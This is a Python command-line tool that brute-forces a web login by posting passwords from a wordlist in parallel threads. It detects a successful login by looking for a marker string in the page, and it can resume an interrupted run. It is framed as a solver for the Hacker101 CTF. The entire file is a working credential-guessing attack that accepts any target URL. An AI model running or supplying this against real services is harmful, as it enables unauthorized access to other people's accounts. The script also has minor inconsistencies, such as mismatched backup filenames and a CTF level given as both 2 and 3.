#!/usr/bin/env python3
# h101_login.py
import json
import os
import pathlib
import sys
import time
from concurrent.futures import ThreadPoolExecutor, Future
from queue import Queue

import click
import requests
from rich.console import Console
from rich.prompt import Prompt


class H101Login:
    """
    This class is for brute forcing passwords at hacker101 CTF level 2.
    """

    def __init__(self, url: str, username: str, wordlist_file: pathlib.Path, max_threads: int, valid_string: str,
                 invalid_string: str) -> None:
        self.c = Console()
        self.p = Prompt()
        self.url: str = url
        self.username = username
        self.wordlist_file: pathlib.Path = wordlist_file
        self.max_threads = max_threads
        self.valid_string = valid_string
        self.invalid_string = invalid_string.strip()
        self.session = requests.Session()
        self.data = {"username": "", "password": ""}
        self.word_queue = Queue()
        self.found_passwd = []
        self.futures = Queue()
        self.serialized_list = []

    def backup_queue(self, word):
        self.serialized_list.append(word)

    def _loop_words(self, seq_number, word):
        word = word.strip()
        if word != "":
            data = {"username": self.username, "password": word}
            self.backup_queue(data["password"])
            response = self.send_request(data)
            self.check_response(seq_number, word, response)

    def create_queue(self, wordlist):
        print("[+] Generating words queue...")
        for word in wordlist:
            self.word_queue.put(word)

    def loop_words(self, wordlist):
        self.create_queue(wordlist)
        print("[+] Queue successfully generated...")
        print(f"[*] Attempting login with username: {self.username}")
        with ThreadPoolExecutor(max_workers=10) as executor:
            seq_number = 1
            try:
                while not self.word_queue.empty():
                    word = self.word_queue.get()
                    future = executor.submit(self._loop_words, seq_number, word)
                    self.futures.put(future)
                    seq_number += 1
            except KeyboardInterrupt:
                self.close()

    def send_request(self, data) -> requests.Session.post:
        response = self.session.post(url=self.url, data=data)
        return response

    def check_response(self, seq_number, word, response):
        try:
            content = response.content.decode()
            if self.invalid_string not in content:
                if self.valid_string in content:
                    print(f"\n[+] Found password: {word}")
                    self.found_passwd.append(word)
                    print(f"\tTotal found passwords ({len(self.found_passwd)}): {self.found_passwd}")
                else:
                    print(f"\n[-] Unknown response: \n{content}", end="")
            else:
                print(f"\r[*] Attempted requests: {seq_number}. Current password: {word}", end=" " * 10)
                sys.stdout.flush()
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.close()

    def start_words_loop(self, resume=False):
        print("[+] Reading wordlist...")
        with open(self.wordlist_file, "r") as wl:
            wordlist = [word.strip() for word in wl.readlines()]
        self.c.print(f"Wordlist length: {len(wordlist)}")
        if resume:
            resume_confirm = self.p.ask("Want to resume previous session?", choices=["y", "n"], show_choices=True,
                                        default="y")
            if resume_confirm == "y":
                with open("h101_backup.json", "r") as bck_file:
                    backup_wordlist = json.load(bck_file)
                    wordlist = [word for word in wordlist if word not in backup_wordlist]
                    self.c.print(
                        f"Total passwords for attack: {len(wordlist)}. Already attempted: {len(backup_wordlist)}")
            else:
                self.c.print(f"Total passwords for attack: {len(wordlist)}")
        elif not resume:
            self.c.print(f"Total passwords for attack: {len(wordlist)}")
        self.loop_words(wordlist)

    def close(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while not self.futures.empty():
                future = self.futures.get()
                if isinstance(future, Future):
                    if not future.cancelled():
                        future.cancel()
            executor.shutdown(wait=True)
        with open(".h101_backup.json", "w") as bkp_file:
            json.dump(self.serialized_list, bkp_file)
        sys.exit("[-] Detected KeyboardInterrupt. Quitting...")

    def run(self):
        try:
            if os.path.exists("h101_backup.json"):
                self.start_words_loop(resume=True)
            else:
                self.start_words_loop()
            try:
                os.remove("h101_backup.json")
            except FileNotFoundError:
                pass
        except KeyboardInterrupt:
            self.close()


@click.command(
    help="""
        This app brute forces passwords at hacker101 CTF level 3.
        """
)
@click.option(
    "-u", "--url", "url",
    required=True,
    help="Type the target URL.",
    type=str,
)
@click.option(
    "-l", "--username", "username",
    help="Type the number of concurrent threads.",
    prompt="Type the username for brute-forcing.",
    default="admin",
    required=True,
    type=str,
)
@click.option(
    "-w", "--wordlist", "wordlist",
    required=True,
    help="Type the path to wordlist file.",
    type=pathlib.Path,
)
@click.option(
    "-m", "--mas_threads", "max_threads",
    help="Type the number of concurrent threads.",
    default=10,
    required=True,
    type=int,
)
@click.option(
    "-v", "--valid_string", "valid_string",
    help="Type successful login string.",
    prompt="Successful login string",
    default="Logged In",
    required=True,
    type=str
)
@click.option(
    "-i", "--invalid_string", "invalid_string",
    help="Type unsuccessful login string.",
    prompt="Unsuccessful login string",
    default="Invalid password",
    required=True,
    type=str
)
def main(url, username, wordlist, max_threads, valid_string, invalid_string):
    login_bypass_robot = H101Login(url, username, wordlist, max_threads, valid_string, invalid_string)
    login_bypass_robot.run()


if __name__ == "__main__":
    main()
